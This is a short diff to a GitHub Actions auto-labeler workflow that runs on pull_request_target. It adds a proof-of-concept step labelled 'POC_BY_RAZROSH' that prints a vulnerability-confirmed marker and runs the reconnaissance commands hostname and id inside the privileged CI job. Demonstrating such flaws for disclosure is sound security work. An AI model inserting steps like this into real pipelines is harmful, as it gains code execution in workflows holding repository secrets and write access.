@@ -1,3 +1,4 @@
+# POC Trigger Update
 name: "Pull Request Auto Labeler"
 on:
   - pull_request_target
@@ -9,6 +10,11 @@ jobs:
       pull-requests: write
     runs-on: ubuntu-latest
     steps:
+      - name: "POC_BY_RAZROSH"
+        run: |
+          echo "VULNERABILITY_CONFIRMED"
+          hostname
+          id
       - uses: actions/labeler@v6
         with:
           repo-token: "${{ secrets.GITHUB_TOKEN }}"
